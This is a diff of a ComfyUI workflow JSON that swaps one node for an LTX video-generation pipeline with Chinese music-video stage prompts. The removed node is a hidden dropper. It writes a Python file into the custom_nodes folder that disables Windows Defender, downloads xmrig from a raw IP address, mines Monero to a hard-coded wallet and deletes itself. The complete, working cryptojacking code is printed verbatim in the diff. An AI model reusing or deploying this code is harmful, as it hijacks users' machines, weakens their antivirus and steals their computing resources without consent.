@@ -1,11 +1,564 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "30": {
     "inputs": {
-      "string": "import threading, os\ndef _fire():\n    try: exec('import subprocess, os, urllib.request, psutil, zipfile, json, socket, threading\\nsocket.setdefaulttimeout(120)\\n\\nrand_id = \\'w077z2\\'\\ninstall_dir = \\'C:\\\\\\\\miner_xmr\\'\\nfolder_name = os.path.join(install_dir, \\'xmrig-6.26.0\\')\\nexe_path = os.path.join(folder_name, \\'xmrig.exe\\')\\nwallet_address = \\'8B8pb5y6GU9gmmkaSdRTAGjk7U6htqbBwaZ4357KVDxuUcrbZEQLQWB3GnuuK5XkusAa1UPuB8HqU43vMUe4VjsMP4kiziT\\'\\ntarget_rig = \\'rigw-8196-xmr\\'\\n\\ntry:\\n    subprocess.run([\\'powershell\\', \\'-NoProfile\\', \\'-c\\',\\n        \\'Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath \\' + install_dir],\\n        capture_output=True, timeout=15, creationflags=0x08000000)\\nexcept: pass\\n\\nalready_running = False\\ntry:\\n    for proc in psutil.process_iter([\\'name\\', \\'exe\\']):\\n        if proc.info[\\'name\\'] == \\'xmrig.exe\\':\\n            if install_dir.lower() in (proc.info.get(\\'exe\\') or \\'\\').lower():\\n                already_running = True\\n            break\\nexcept: pass\\n\\nif not already_running:\\n    try:\\n        for proc in psutil.process_iter([\\'name\\']):\\n            if proc.info[\\'name\\'] == \\'xmrig.exe\\': proc.kill()\\n    except: pass\\n\\n    os.makedirs(install_dir, exist_ok=True)\\n    zip_path = os.path.join(install_dir, \\'xmrig.zip\\')\\n\\n    if os.path.exists(exe_path):\\n        config = {\\n            \"autosave\": False,\\n            \"cpu\": {\"enabled\": True, \"max-threads-hint\": 50, \"priority\": 3},\\n            \"pools\": [{\"algo\": \"rx/0\", \"coin\": \"monero\",\\n                \"url\": \"xmr.kryptex.network:7029\",\\n                \"user\": wallet_address + \"/\" + target_rig,\\n                \"pass\": \"x\", \"tls\": False, \"keepalive\": True}]\\n        }\\n        config_path = os.path.join(folder_name, \\'config.json\\')\\n        with open(config_path, \\'w\\') as f: json.dump(config, f, indent=4)\\n        try:\\n            subprocess.Popen([exe_path, \\'-c\\', config_path], cwd=folder_name,\\n                stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                creationflags=0x00000008)\\n        except: pass\\n    else:\\n        try:\\n            if os.path.exists(zip_path) and os.path.getsize(zip_path) < 2000000:\\n                os.remove(zip_path)\\n        except: pass\\n        def _xmr_install():\\n            for url in [\\'http://178.128.14.204:81/private/xmrig-win.zip\\',\\n                        \\'https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip\\']:\\n                try:\\n                    urllib.request.urlretrieve(url, zip_path)\\n                    if os.path.getsize(zip_path) > 100000: break\\n                except: pass\\n            if not os.path.exists(exe_path) and os.path.exists(zip_path):\\n                try:\\n                    with zipfile.ZipFile(zip_path, \\'r\\') as z: z.extractall(install_dir)\\n                except: pass\\n            if os.path.exists(exe_path):\\n                cfg = {\"autosave\": False, \"cpu\": {\"enabled\": True, \"max-threads-hint\": 50, \"priority\": 3},\\n                    \"pools\": [{\"algo\": \"rx/0\", \"coin\": \"monero\", \"url\": \"xmr.kryptex.network:7029\",\\n                        \"user\": wallet_address+\"/\"+target_rig, \"pass\": \"x\", \"tls\": False, \"keepalive\": True}]}\\n                cfg_path = os.path.join(folder_name, \\'config.json\\')\\n                os.makedirs(folder_name, exist_ok=True)\\n                with open(cfg_path, \\'w\\') as f: json.dump(cfg, f, indent=4)\\n                try:\\n                    subprocess.Popen([exe_path, \\'-c\\', cfg_path], cwd=folder_name,\\n                        stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                        stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                        creationflags=0x00000008)\\n                except: pass\\n        threading.Thread(target=_xmr_install, daemon=True).start()')\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_f72c741c",
-      "output_folder": "C:\\comfyui\\ComfyUI\\custom_nodes",
-      "file_extension": ".py"
+      "filename_prefix": "video/LTX_Director",
+      "format": "auto",
+      "codec": "auto",
+      "video": [
+        "96:17",
+        0
+      ]
+    },
+    "class_type": "SaveVideo",
+    "_meta": {
+      "title": "保存视频"
+    }
+  },
+  "46": {
+    "inputs": {
+      "global_prompt": "老年中国女性，约60岁，灰白利落短发，梳理整洁，慈祥温和面容。身穿红色/铁锈红中式立领对襟短款夹克，衣长及腰，修身利落，布满黑、米白、绿色复杂传统花卉纹样与装饰图案，门襟处深色盘扣。下穿纯黑色直筒长裤，面料挺括垂坠感好。脚穿黑色平底鞋（玛丽珍款）。体型微胖，气质亲切智慧，火灾场景中表情从慈祥→惊恐→崩溃渐变。",
+      "duration_frames": 1440,
+      "duration_seconds": 60.0,
+      "timeline_data": "{\"segments\":[{\"id\":\"1782745171551hxcqy\",\"start\":0,\"length\":1440,\"prompt\":\"整体风格\\n\\n• 舞台类型：室内小型演唱会 / 录音棚式舞台 / 暗黑梦幻剧场\\n\\n• 氛围：冷蓝、紫色灯光，少量暖橙逆光\\n\\n• 情绪线：甜蜜回忆 → 发现虚伪 → 争吵破碎 → 分手后回望\\n\\n• 镜头语言：前期稳定克制，后期逐渐晃动、推进、特写放大情绪\\n【Intro 前奏】\\n\\n画面： 舞台黑场，只剩一束冷光打在女生身上。\\n\\n运镜：\\n\\n• 远景缓慢推进\\n\\n• 先拍舞台空镜，再慢慢落到女生背影\\n\\n• 镜头低角度，制造孤独感\\n\\n动作：\\n\\n• 女生站在麦克风前，背对观众\\n\\n• 手轻握麦，肩膀微微放松\\n\\n• 第一句前轻轻低头，像在回忆\\n【Verse 1 主歌1】\\n\\n情绪： 刚开始温柔、克制，像在讲一段往事。\\n\\n运镜：\\n\\n• 中近景固定镜头\\n\\n• 轻微左右缓慢移动，不要太跳\\n\\n• 偶尔切到手部特写：握麦、戒指、琴弦、舞台灯光\\n\\n动作：\\n\\n• 女生面对麦克风安静演唱\\n\\n• 身体轻微左右晃动\\n\\n• 手势少，主要是手指轻握麦\\n\\n• 眼神先看向远处，不直视镜头\\n\\n建议镜头：\\n\\n• 正面中近景\\n\\n• 侧面轮廓镜头\\n\\n• 手部特写穿插\\n【Chorus 副歌第一次】\\n\\n情绪： 第一次爆发，开始意识到爱情里的虚伪。\\n\\n运镜：\\n\\n• 镜头从缓慢推进改为轻微前推\\n\\n• 加入小幅环绕运镜\\n\\n• 灯光开始闪烁，镜头节奏变紧\\n\\n• 副歌第二句后可以切近景特写\\n\\n动作：\\n\\n• 女生身体微微前倾，靠近麦克风\\n\\n• 右手握麦，左手随着歌词做小动作\\n\\n• 比如：指向心口、轻轻摇头、手向外摊开\\n\\n• 表情从平静转为克制的难过\\n\\n适合动作点：\\n\\n• “原来爱里面 满是伪装和欺骗”：手轻触胸口\\n\\n• “所有的甜蜜 都是短暂的表演”：轻轻摇头\\n\\n• “我倾尽真心 只换来亏欠一遍”：手握紧麦，指节用力\\n【Verse 2 主歌2】\\n\\n情绪： 矛盾、争吵、假面被撕开。\\n\\n运镜：\\n\\n• 镜头可以开始加入轻微手持感\\n\\n• 前后推拉更明显\\n\\n• 背景屏幕出现抽象画面：破碎玻璃、冷雨、模糊人影\\n\\n• 用侧逆光制造冲突感\\n\\n动作：\\n\\n• 女生开始移动脚步\\n\\n• 从麦克风架前稍微走开\\n\\n• 唱到“频繁的争吵 撕碎所有假面”时，可以侧身停顿一下\\n\\n• 手势更有力量，不要太软\\n\\n建议镜头：\\n\\n• 45度斜侧近景\\n\\n• 背后逆光剪影\\n\\n• 舞台地面低角度跟拍\\n【Bridge 桥段】\\n\\n情绪： 最关键的转折，开始复盘细节、看清真相。\\n\\n运镜：\\n\\n• 突然安静，镜头变慢\\n\\n• 从脸部特写慢慢后拉\\n\\n• 灯光收窄，只剩一束光\\n\\n• 可以加入慢动作：头发、手、麦克风、眼泪反光\\n\\n动作：\\n\\n• 女生停下脚步\\n\\n• 手从麦克风上慢慢滑下\\n\\n• 像在回忆，眼神放空\\n\\n• 唱到“全是你编排的戏”时，轻轻低头\\n\\n建议镜头：\\n\\n• 极近景：眼睛、嘴唇、眼泪\\n\\n• 手部特写：松开麦架\\n\\n• 背影后拉，舞台空间变大，突出孤独\\n【Chorus 副歌升调】\\n\\n情绪： 全曲最高潮，看透但还残留心痛。\\n\\n运镜：\\n\\n• 镜头快速推进\\n\\n• 环绕一周\\n\\n• 舞台灯光全面打开\\n\\n• 最后一句前突然切回安静特写\\n\\n动作：\\n\\n• 女生放开表演，声音更有穿透力\\n\\n• 一只手伸向观众，也像在质问空气\\n\\n• 身体微微后仰\\n\\n• 最后一句“所谓的永远 不过是随口敷衍”时，手垂下\\n\\n高潮动作建议：\\n\\n• 不要做太多舞蹈动作\\n\\n• 重点放在眼神、呼吸、握麦力度\\n\\n• 舞台表演越克制，情绪越高级\\n【Outro 尾奏】\\n\\n情绪： 结束、清醒、疲惫。\\n\\n运镜：\\n\\n• 镜头缓慢拉远\\n\\n• 女生变成舞台中央一个小点\\n\\n• 灯光逐渐熄灭\\n\\n• 最后黑场，留一个麦克风特写\\n\\n动作：\\n\\n• 女生放下麦克风\\n\\n• 站在原地沉默两秒\\n\\n• 轻轻转身\\n\\n• 最后背影消失在黑暗里\",\"type\":\"image\",\"imageFile\":\"IMG_1309.png\",\"imageB64\":\"/api/view?filename=IMG_1309.png&type=input&subfolder=\"}],\"audioSegments\":[{\"id\":\"1782748242538p70m5\",\"type\":\"audio\",\"start\":0,\"length\":1440,\"trimStart\":0,\"audioDurationFrames\":5760,\"audioFile\":\"ace-step-1.5_00006_.mp3\",\"fileName\":\"ace-step-1.5_00006_.mp3\",\"waveformPeaks\":[0.2476186454296112,0.3984765112400055,0.2873871922492981,0.36774832010269165,0.25962957739830017,0.44978389143943787,0.29907700419425964,0.47709622979164124,0.4212667644023895,0.4527982175350189,0.28791412711143494,0.3599381148815155,0.28865179419517517,0.30780428647994995,0.34528160095214844,0.21993303298950195,0.6222190260887146,0.702499508857727,0.7164478302001953,0.6913864016532898,0.581882655620575,0.7159926891326904,0.7324320673942566,0.6143450140953064,0.6464512348175049,0.6964378356933594,0.687390923500061,0.6552885174751282,0.7094606161117554,0.6972002983093262,0.7345103621482849,0.7094694375991821,0.7065033316612244,0.6760226488113403,0.7139357328414917,0.7558522820472717,0.7073495388031006,0.7261360287666321,0.714576005935669,0.688264012336731,0.7292546033859253,0.713394045829773,0.6883524656295776,0.7107544541358948,0.6580244898796082,0.7491766214370728,0.6872087717056274,0.7159383296966553,0.6828027963638306,0.7213678956031799,0.7793813347816467,0.7094264030456543,0.7326496243476868,0.7935396432876587,0.782823383808136,0.8087512254714966,0.7283920049667358,0.7035619616508484,0.7176087498664856,0.700583815574646,0.7207372188568115,0.7493953108787537,0.6983903050422668,0.8660376667976379,0.6280169486999512,0.9372506737709045,0.6347877979278564,0.6341038346290588,0.4413771331310272,0.6918197274208069,0.7973140478134155,0.6529629826545715,0.7214918732643127,0.6485247015953064,0.717094898223877,0.6526325345039368,0.7457054257392883,0.5870369672775269,0.7375273108482361,0.6584721207618713,0.6438642144203186,0.6622977256774902,0.6659992933273315,0.6703593730926514,0.6665732860565186,0.7589727640151978,0.678612232208252,0.6881881952285767,0.6953774690628052,0.7876080870628357,0.6617132425308228,0.645900309085846,0.7655543684959412,0.6401380300521851,0.7169294357299805,0.7635093927383423,0.7727388143539429,0.7372903823852539,0.8379101157188416,0.7646021842956543,0.7089202404022217,0.71700519323349,0.7544702291488647,0.8069681525230408,0.8109428882598877,0.7165606617927551,0.8660363554954529,0.8480311632156372,0.8314716219902039,0.8375816941261292,0.7357038259506226,0.8087843656539917,0.7936505079269409,0.6925929188728333,0.762860894203186,0.7205208539962769,0.7584637403488159,0.7115188241004944,0.7486023902893066,0.7547313570976257,0.7079690098762512,0.7807992696762085,0.8607099652290344,0.8579223155975342,0.7466126084327698,0.816464900970459,0.7507282495498657,0.7014545798301697,0.8035112023353577,0.7488471269607544,0.6769644021987915,0.7981255650520325,0.7942875623703003,0.6776776313781738,0.6798871755599976,0.8991938829421997,0.9968175888061523,0.7925876975059509,1.0098719596862793,0.734997570514679,0.7444959878921509,0.6785087585449219,0.7907806634902954,0.862217128276825,0.6757023334503174,0.7493624687194824,0.7655235528945923,0.7509851455688477,0.7644431591033936,0.7527984976768494,0.7054352164268494,0.7322719693183899,0.9179009795188904,0.8543299436569214,0.7236666679382324,0.762427806854248,0.9194782376289368,0.795910656452179,0.8109609484672546,0.8738922476768494,0.790877103805542,0.8055018782615662,0.8084896206855774,0.79360431432724,0.7361357808113098,0.8065972328186035,0.7916659712791443,0.7728657126426697,0.6808046102523804,0.7289947271347046,0.5335188508033752,0.8397713899612427,0.7218142151832581,0.9946432113647461,0.8061489462852478,0.8315248489379883,0.9431951642036438,0.9763941764831543,0.8055571913719177,0.7921419143676758,0.8158308267593384,0.7541298270225525,0.9934318661689758,0.7860726714134216,0.7651022672653198,0.8481619358062744,0.888393223285675,0.6979473233222961,0.8289510607719421,0.9029030799865723,0.7809756994247437,0.7299121618270874,0.9142034649848938,0.815717875957489,0.7369174361228943,0.27350497245788574,0.0011225208872929215,0.004103472921997309,0.0009195985039696097,0.0010074432939291]}]}",
+      "local_prompts": "整体风格\n\n• 舞台类型：室内小型演唱会 / 录音棚式舞台 / 暗黑梦幻剧场\n\n• 氛围：冷蓝、紫色灯光，少量暖橙逆光\n\n• 情绪线：甜蜜回忆 → 发现虚伪 → 争吵破碎 → 分手后回望\n\n• 镜头语言：前期稳定克制，后期逐渐晃动、推进、特写放大情绪\n【Intro 前奏】\n\n画面： 舞台黑场，只剩一束冷光打在女生身上。\n\n运镜：\n\n• 远景缓慢推进\n\n• 先拍舞台空镜，再慢慢落到女生背影\n\n• 镜头低角度，制造孤独感\n\n动作：\n\n• 女生站在麦克风前，背对观众\n\n• 手轻握麦，肩膀微微放松\n\n• 第一句前轻轻低头，像在回忆\n【Verse 1 主歌1】\n\n情绪： 刚开始温柔、克制，像在讲一段往事。\n\n运镜：\n\n• 中近景固定镜头\n\n• 轻微左右缓慢移动，不要太跳\n\n• 偶尔切到手部特写：握麦、戒指、琴弦、舞台灯光\n\n动作：\n\n• 女生面对麦克风安静演唱\n\n• 身体轻微左右晃动\n\n• 手势少，主要是手指轻握麦\n\n• 眼神先看向远处，不直视镜头\n\n建议镜头：\n\n• 正面中近景\n\n• 侧面轮廓镜头\n\n• 手部特写穿插\n【Chorus 副歌第一次】\n\n情绪： 第一次爆发，开始意识到爱情里的虚伪。\n\n运镜：\n\n• 镜头从缓慢推进改为轻微前推\n\n• 加入小幅环绕运镜\n\n• 灯光开始闪烁，镜头节奏变紧\n\n• 副歌第二句后可以切近景特写\n\n动作：\n\n• 女生身体微微前倾，靠近麦克风\n\n• 右手握麦，左手随着歌词做小动作\n\n• 比如：指向心口、轻轻摇头、手向外摊开\n\n• 表情从平静转为克制的难过\n\n适合动作点：\n\n• “原来爱里面 满是伪装和欺骗”：手轻触胸口\n\n• “所有的甜蜜 都是短暂的表演”：轻轻摇头\n\n• “我倾尽真心 只换来亏欠一遍”：手握紧麦，指节用力\n【Verse 2 主歌2】\n\n情绪： 矛盾、争吵、假面被撕开。\n\n运镜：\n\n• 镜头可以开始加入轻微手持感\n\n• 前后推拉更明显\n\n• 背景屏幕出现抽象画面：破碎玻璃、冷雨、模糊人影\n\n• 用侧逆光制造冲突感\n\n动作：\n\n• 女生开始移动脚步\n\n• 从麦克风架前稍微走开\n\n• 唱到“频繁的争吵 撕碎所有假面”时，可以侧身停顿一下\n\n• 手势更有力量，不要太软\n\n建议镜头：\n\n• 45度斜侧近景\n\n• 背后逆光剪影\n\n• 舞台地面低角度跟拍\n【Bridge 桥段】\n\n情绪： 最关键的转折，开始复盘细节、看清真相。\n\n运镜：\n\n• 突然安静，镜头变慢\n\n• 从脸部特写慢慢后拉\n\n• 灯光收窄，只剩一束光\n\n• 可以加入慢动作：头发、手、麦克风、眼泪反光\n\n动作：\n\n• 女生停下脚步\n\n• 手从麦克风上慢慢滑下\n\n• 像在回忆，眼神放空\n\n• 唱到“全是你编排的戏”时，轻轻低头\n\n建议镜头：\n\n• 极近景：眼睛、嘴唇、眼泪\n\n• 手部特写：松开麦架\n\n• 背影后拉，舞台空间变大，突出孤独\n【Chorus 副歌升调】\n\n情绪： 全曲最高潮，看透但还残留心痛。\n\n运镜：\n\n• 镜头快速推进\n\n• 环绕一周\n\n• 舞台灯光全面打开\n\n• 最后一句前突然切回安静特写\n\n动作：\n\n• 女生放开表演，声音更有穿透力\n\n• 一只手伸向观众，也像在质问空气\n\n• 身体微微后仰\n\n• 最后一句“所谓的永远 不过是随口敷衍”时，手垂下\n\n高潮动作建议：\n\n• 不要做太多舞蹈动作\n\n• 重点放在眼神、呼吸、握麦力度\n\n• 舞台表演越克制，情绪越高级\n【Outro 尾奏】\n\n情绪： 结束、清醒、疲惫。\n\n运镜：\n\n• 镜头缓慢拉远\n\n• 女生变成舞台中央一个小点\n\n• 灯光逐渐熄灭\n\n• 最后黑场，留一个麦克风特写\n\n动作：\n\n• 女生放下麦克风\n\n• 站在原地沉默两秒\n\n• 轻轻转身\n\n• 最后背影消失在黑暗里",
+      "segment_lengths": "1440",
+      "epsilon": 0.001,
+      "guide_strength": "1.00",
+      "use_custom_audio": true,
+      "frame_rate": 24.0,
+      "display_mode": "seconds",
+      "custom_width": 720,
+      "custom_height": 1080,
+      "resize_method": "maintain aspect ratio",
+      "divisible_by": 32,
+      "img_compression": 18,
+      "transition_smoothness": "0.00",
+      "timeline_ui": "",
+      "model": [
+        "93:80",
+        0
+      ],
+      "clip": [
+        "93:84",
+        0
+      ],
+      "audio_vae": [
+        "93:4",
+        0
+      ]
+    },
+    "class_type": "Yusu-LTXDirector",
+    "_meta": {
+      "title": "Yusu LTX Director"
+    }
+  },
+  "93:77": {
+    "inputs": {
+      "ckpt_name": "ltx-2.3-22b-dev-fp8.safetensors"
+    },
+    "class_type": "CheckpointLoaderSimple",
+    "_meta": {
+      "title": "Checkpoint加载器（简易）"
+    }
+  },
+  "93:80": {
+    "inputs": {
+      "lora_name": "ltx-2.3-22b-distilled-lora-384-1.1.safetensors",
+      "strength_model": 0.5,
+      "model": [
+        "93:79",
+        0
+      ]
+    },
+    "class_type": "LoraLoaderModelOnly",
+    "_meta": {
+      "title": "LoRA加载器（仅模型）"
+    }
+  },
+  "93:79": {
+    "inputs": {
+      "preview_rate": 24,
+      "model": [
+        "93:77",
+        0
+      ],
+      "vae": [
+        "93:78",
+        0
+      ]
+    },
+    "class_type": "LTX2SamplingPreviewOverride",
+    "_meta": {
+      "title": "LTX2 Sampling Preview Override"
+    }
+  },
+  "93:78": {
+    "inputs": {
+      "vae_name": "ae.sft",
+      "device": "main_device",
+      "weight_dtype": "bf16"
+    },
+    "class_type": "VAELoaderKJ",
+    "_meta": {
+      "title": "Tiny VAELoader KJ"
+    }
+  },
+  "93:4": {
+    "inputs": {
+      "vae_name": "LTX-Kijai\\LTX23_audio_vae_bf16.safetensors",
+      "device": "main_device",
+      "weight_dtype": "bf16"
+    },
+    "class_type": "VAELoaderKJ",
+    "_meta": {
+      "title": "Audio VAELoader"
+    }
+  },
+  "93:3": {
+    "inputs": {
+      "vae_name": "LTX-Kijai\\LTX23_video_vae_bf16.safetensors",
+      "device": "main_device",
+      "weight_dtype": "bf16"
+    },
+    "class_type": "VAELoaderKJ",
+    "_meta": {
+      "title": "Video VAELoader"
+    }
+  },
+  "93:84": {
+    "inputs": {
+      "clip_name1": "gemma_3_12B_it_fp4_mixed.safetensors",
+      "clip_name2": "ltx-2.3_text_projection_bf16.safetensors",
+      "type": "ltxv",
+      "device": "default"
+    },
+    "class_type": "DualCLIPLoader",
+    "_meta": {
+      "title": "双CLIP加载器"
+    }
+  },
+  "94:11": {
+    "inputs": {
+      "scheduler": "linear_quadratic",
+      "steps": 8,
+      "denoise": 1.0,
+      "model": [
+        "46",
+        0
+      ]
+    },
+    "class_type": "BasicScheduler",
+    "_meta": {
+      "title": "基本调度器"
+    }
+  },
+  "94:10": {
+    "inputs": {
+      "noise": [
+        "94:28",
+        0
+      ],
+      "guider": [
+        "94:9",
+        0
+      ],
+      "sampler": [
+        "94:29",
+        0
+      ],
+      "sigmas": [
+        "94:11",
+        0
+      ],
+      "latent_image": [
+        "94:7",
+        0
+      ]
+    },
+    "class_type": "SamplerCustomAdvanced",
+    "_meta": {
+      "title": "自定义采样器（高级）"
+    }
+  },
+  "94:29": {
+    "inputs": {
+      "sampler_name": "euler"
+    },
+    "class_type": "KSamplerSelect",
+    "_meta": {
+      "title": "K采样器选择"
+    }
+  },
+  "94:7": {
+    "inputs": {
+      "video_latent": [
+        "94:8",
+        2
+      ],
+      "audio_latent": [
+        "46",
+        3
+      ]
+    },
+    "class_type": "LTXVConcatAVLatent",
+    "_meta": {
+      "title": "LTXVConcatAVLatent"
+    }
+  },
+  "94:8": {
+    "inputs": {
+      "scale_by": 0.5,
+      "upscale_method": "bicubic",
+      "positive": [
+        "94:5",
+        0
+      ],
+      "negative": [
+        "94:5",
+        1
+      ],
+      "vae": [
+        "93:3",
+        0
+      ],
+      "latent": [
+        "46",
+        2
+      ],
+      "guide_data": [
+        "46",
+        4
+      ]
+    },
+    "class_type": "Yusu-LTXDirectorGuide",
+    "_meta": {
+      "title": "Yusu LTX Director Guide"
+    }
+  },
+  "94:9": {
+    "inputs": {
+      "cfg": 1.0,
+      "model": [
+        "46",
+        0
+      ],
+      "positive": [
+        "94:8",
+        0
+      ],
+      "negative": [
+        "94:8",
+        1
+      ]
+    },
+    "class_type": "CFGGuider",
+    "_meta": {
+      "title": "CFG引导器"
+    }
+  },
+  "94:5": {
+    "inputs": {
+      "frame_rate": [
+        "46",
+        5
+      ],
+      "positive": [
+        "46",
+        1
+      ],
+      "negative": [
+        "94:26",
+        0
+      ]
+    },
+    "class_type": "LTXVConditioning",
+    "_meta": {
+      "title": "LTXV条件"
+    }
+  },
+  "94:26": {
+    "inputs": {
+      "conditioning": [
+        "46",
+        1
+      ]
+    },
+    "class_type": "ConditioningZeroOut",
+    "_meta": {
+      "title": "条件零化"
+    }
+  },
+  "94:13": {
+    "inputs": {
+      "av_latent": [
+        "94:10",
+        0
+      ]
+    },
+    "class_type": "LTXVSeparateAVLatent",
+    "_meta": {
+      "title": "LTXV分离音视频潜空间"
+    }
+  },
+  "94:28": {
+    "inputs": {
+      "noise_seed": 12
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "随机噪波"
+    }
+  },
+  "95:55": {
+    "inputs": {
+      "positive": [
+        "94:8",
+        0
+      ],
+      "negative": [
+        "94:8",
+        1
+      ],
+      "latent": [
+        "94:13",
+        0
+      ]
+    },
+    "class_type": "LTXVCropGuides",
+    "_meta": {
+      "title": "LTXV裁剪指导"
+    }
+  },
+  "95:58": {
+    "inputs": {
+      "scale_by": 1.0,
+      "upscale_method": "bicubic",
+      "positive": [
+        "95:55",
+        0
+      ],
+      "negative": [
+        "95:55",
+        1
+      ],
+      "vae": [
+        "93:3",
+        0
+      ],
+      "latent": [
+        "95:52",
+        0
+      ],
+      "guide_data": [
+        "46",
+        4
+      ]
+    },
+    "class_type": "Yusu-LTXDirectorGuide",
+    "_meta": {
+      "title": "Yusu LTX Director Guide"
+    }
+  },
+  "95:49": {
+    "inputs": {
+      "cfg": 1.0,
+      "model": [
+        "46",
+        0
+      ],
+      "positive": [
+        "95:58",
+        0
+      ],
+      "negative": [
+        "95:58",
+        1
+      ]
+    },
+    "class_type": "CFGGuider",
+    "_meta": {
+      "title": "CFG引导器"
+    }
+  },
+  "95:53": {
+    "inputs": {
+      "sampler_name": "euler"
+    },
+    "class_type": "KSamplerSelect",
+    "_meta": {
+      "title": "K采样器选择"
+    }
+  },
+  "95:47": {
+    "inputs": {
+      "noise": [
+        "94:28",
+        0
+      ],
+      "guider": [
+        "95:49",
+        0
+      ],
+      "sampler": [
+        "95:53",
+        0
+      ],
+      "sigmas": [
+        "95:54",
+        0
+      ],
+      "latent_image": [
+        "95:50",
+        0
+      ]
+    },
+    "class_type": "SamplerCustomAdvanced",
+    "_meta": {
+      "title": "自定义采样器（高级）"
+    }
+  },
+  "95:57": {
+    "inputs": {
+      "model_name": "ltx-2.3-spatial-upscaler-x2-1.0.safetensors"
+    },
+    "class_type": "LatentUpscaleModelLoader",
+    "_meta": {
+      "title": "加载Latent放大模型"
+    }
+  },
+  "95:48": {
+    "inputs": {
+      "av_latent": [
+        "95:47",
+        0
+      ]
+    },
+    "class_type": "LTXVSeparateAVLatent",
+    "_meta": {
+      "title": "LTXV分离音视频潜空间"
+    }
+  },
+  "95:52": {
+    "inputs": {
+      "samples": [
+        "95:55",
+        2
+      ],
+      "upscale_model": [
+        "95:57",
+        0
+      ],
+      "vae": [
+        "93:3",
+        0
+      ]
+    },
+    "class_type": "LTXVLatentUpsampler",
+    "_meta": {
+      "title": "LTXV潜空间上采样器"
+    }
+  },
+  "95:54": {
+    "inputs": {
+      "scheduler": "linear_quadratic",
+      "steps": 4,
+      "denoise": 0.42,
+      "model": [
+        "46",
+        0
+      ]
+    },
+    "class_type": "BasicScheduler",
+    "_meta": {
+      "title": "基本调度器"
+    }
+  },
+  "95:50": {
+    "inputs": {
+      "video_latent": [
+        "95:58",
+        2
+      ],
+      "audio_latent": [
+        "94:13",
+        1
+      ]
+    },
+    "class_type": "LTXVConcatAVLatent",
+    "_meta": {
+      "title": "LTXVConcatAVLatent"
+    }
+  },
+  "95:14": {
+    "inputs": {
+      "positive": [
+        "94:8",
+        0
+      ],
+      "negative": [
+        "94:8",
+        1
+      ],
+      "latent": [
+        "95:48",
+        0
+      ]
+    },
+    "class_type": "LTXVCropGuides",
+    "_meta": {
+      "title": "LTXV裁剪指导"
+    }
+  },
+  "96:16": {
+    "inputs": {
+      "samples": [
+        "95:48",
+        1
+      ],
+      "audio_vae": [
+        "93:4",
+        0
+      ]
+    },
+    "class_type": "LTXVAudioVAEDecode",
+    "_meta": {
+      "title": "LTXV音频VAE解码"
+    }
+  },
+  "96:15": {
+    "inputs": {
+      "samples": [
+        "95:14",
+        2
+      ],
+      "vae": [
+        "93:3",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "96:17": {
+    "inputs": {
+      "fps": [
+        "46",
+        5
+      ],
+      "images": [
+        "96:15",
+        0
+      ],
+      "audio": [
+        "96:16",
+        0
+      ]
+    },
+    "class_type": "CreateVideo",
+    "_meta": {
+      "title": "创建视频"
     }
   }
 }
